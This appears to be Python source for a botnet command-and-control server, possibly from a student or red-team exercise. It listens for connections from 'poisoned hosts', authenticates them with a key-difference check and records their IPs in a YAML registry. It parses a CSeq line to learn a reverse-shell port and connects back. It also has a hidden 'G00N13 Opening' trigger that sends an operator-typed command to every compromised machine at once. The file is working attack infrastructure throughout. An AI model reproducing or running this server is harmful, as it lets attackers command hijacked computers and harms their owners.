import socket
import threading
import time
import random
from Werkheiser import Werkheiser
from Event import Event
from pathlib import Path
import yaml

class C2:
    def __init__(self):
        self.werkheiser_registry = Path('Werkheisers.yml')
        self.events = []
        self.werkheisers = {}
        self.server_socket = None
        self.lock = threading.Lock()
        self.driver_work = threading.Thread(target=self.irs)
        self.driver_work.start()

        if self.werkheiser_registry.exists():
            self.read_werkheisers()
        else:
            self.create_werkheisers()

        # I don't know much about cryptography and this can be easily broken :P
        # Max or Kyler clutch up, on some gvng shit
        self.key_differences = []

        # Shout out if you get the reference :DDDD
        self.c2_agent_key = 'Bandits ate my Natass'
        self.c2_nuclear_football = 'G00N13 Opening'

        # Calculate the differences.
        for i in range(len(self.c2_agent_key) - 1):
            self.key_differences.append(ord(self.c2_agent_key[i + 1]) - ord(self.c2_agent_key[i]))

    def create_werkheisers(self):
        with self.werkheiser_registry.open('w') as WK:
            WK.close() 

    def read_werkheisers(self):
        self.werkheisers.clear()
        with self.werkheiser_registry.open('r') as WK:
            wk_loaded = yaml.safe_load(WK)
            for k, v in wk_loaded.items():
                if v not in self.werkheisers:
                    self.werkheisers[v] = Werkheiser(v)
            WK.close()

    def save_werkheisers(self):
        wk_save = {}
        for i, e in enumerate(self.werkheisers.keys()):
            wk_save[i] = e
        with self.werkheiser_registry.open('w') as WK:
            yaml.dump(wk_save, WK)
            WK.close()

    def get_werkheisers(self):
        # Get all of the Werkheisers.
        return self.werkheisers
    
    def dispatch(self, ips, event):
        # Tell workers with a given IP what to do. Or...
        # First, check if we're playing football.
        if len(ips) == 1 and ips[0] == self.c2_nuclear_football:
            # We have our opening... time for the approach.
            print('[+] G00N13 opening detected! Attempting the G00N13 approach...')

            # All hands on deck.
            with self.lock:
                for ip in self.werkheisers.keys():
                    print(f'[+] Notified {self.werkheisers[ip]} to do "{event}"...')
                    self.werkheisers[ip].queue(Event(event))
            return
        
        for ip in ips:
            with self.lock:
                # Check if that IP is authorized...
                if ip not in self.werkheisers.keys():
                    print(f'[!] IP {ip} not an authorized Werkheiser; skipping...')
                    continue
                
                # Queue it up.
                self.werkheisers[ip].queue(event)
            
    def authenticate_werkheiser(self, client_key):
        for i in range(len(self.key_differences) - 1):
            if (ord(client_key[i + 1]) - ord(client_key[i]) != self.key_differences[i]):
                return False
        return True

    def irs(self):
        # Start a socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('0.0.0.0', 23765))
        self.server_socket.listen(1)

        while True:
            # Wait for connection. 
            c_s, connection_info = self.server_socket.accept()

            # Once we have a connection, store information.
            (c_address, c_port) = connection_info
            print('Got a potential client')

            # Wait for a sentinel message to make sure we are talking to a poisoned host.
            # Set the timeout to 3 seconds
            c_s.settimeout(3)

            # Wait for message
            message = b''
            message_decoded = ''
            try:
                while (c := c_s.recv(0x1)):
                    message += c
                    if c == b'\n':
                        break
            except socket.timeout:
                pass
            
            try:
                message_decoded = message.decode()
            except:
                print('Bad message... goodbye')
                time.sleep(2 + random.random() * 10)
                c_s.close()
                pass

            if not self.authenticate_werkheiser(message_decoded):
                print(message_decoded)
                # Remove them if they are in the address book. Could be someone who got control back.
                if c_address in self.werkheisers.keys():
                    del self.werkheisers[c_address]

                # Delay closing the connection for a random time so they can't sidechannel our shit
                time.sleep(2 + random.random() * 10)

                # Get this bumass n outta here...
                c_s.close()
                continue

            with self.lock:
                # Update address book if not already there.
                if c_address not in self.werkheisers.keys():
                    self.werkheisers[c_address] = Werkheiser(c_address)
                    self.save_werkheisers()

            # Read the rest of the message to get the port for the reverse shell
            try:
                rtsp_message = c_s.recv(0x1000).decode().strip()
                rtsp_lines = rtsp_message.split('\n')
                c_s.close()
                if len(rtsp_lines) != 2:
                    raise Exception("LMAO THIS AINT REAL BRUH!")
                cseq_message = rtsp_lines[1]
                # Tokenize cseq message.
                cseq_tokenized = cseq_message.split()
                if len(cseq_tokenized) != 2 or cseq_tokenized[0] != 'CSeq:':
                    raise Exception("LMAO BAD CSEQ")
                port = cseq_tokenized[1]
                if not port.isnumeric():
                    raise Exception("LMAO THAT PORT AIN'T GOOD BRUH!")
                port_int = int(port)
                if port_int >= 65536:
                    raise Exception("BRUH YOU TAKE 453???? FOH B")
                
                time.sleep(1)
                print(f'[+] Connecting to client on port {port_int}...')
                
                # Connect to this port to notify to forward all of the notifications
                self.werkheisers[c_address].notify(port_int)
            except socket.timeout:
                print('Disconnected.')
                pass
            
def main():
    Server = C2()
    while True:
        message = input('(dispatch) ')
        Server.dispatch(['G00N13 Opening'], message)

if __name__ == '__main__':
    main()
